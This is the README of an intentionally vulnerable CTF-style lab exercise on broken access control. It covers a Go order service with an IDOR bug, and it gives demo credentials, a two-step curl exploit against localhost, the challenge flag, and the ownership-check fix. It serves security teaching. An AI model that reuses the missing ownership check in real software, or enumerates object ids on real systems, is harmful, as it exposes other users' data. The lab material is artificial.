# A01: Broken Access Control

⚠️ **Intentionally vulnerable — do not deploy to a real network or reuse this code.**

## Scenario

An order-lookup service. Log in as any demo user, then fetch orders by id.

Demo credentials: `alice / alice123`, `bob / bob123`.

**Play it in the browser** — open http://localhost:9001, sign in, then try different
order ids in the "Track an order" box (your own order shows up automatically
under "My Orders"). The `curl` below is just what the page does under the hood.

## The bug

`getOrderHandler` in `main.go` checks that the caller has a valid session
token, but never checks that the requested order belongs to that session's
user:

```go
// BUG: no check that orders[id].OwnerID == the authenticated user's id.
ord, found := orders[id]
```

Any authenticated user can view any order by guessing/enumerating its id —
a classic Insecure Direct Object Reference (IDOR).

## Exploit

```bash
TOKEN=$(curl -s -X POST http://localhost:9001/login \
  -d '{"username":"alice","password":"alice123"}' | jq -r .token)

curl -s http://localhost:9001/api/orders/1003 \
  -H "Authorization: Bearer $TOKEN"
```

Order `1003` belongs to `admin`, not `alice` — but the API hands it over anyway.

## Flag

`CTF{a01_1d0r_ac7ually_ch3ck_own3rsh1p}`

## The fix (for reference)

Check ownership before returning the resource:
`if ord.OwnerID != authenticatedUserID { return 403 }`.
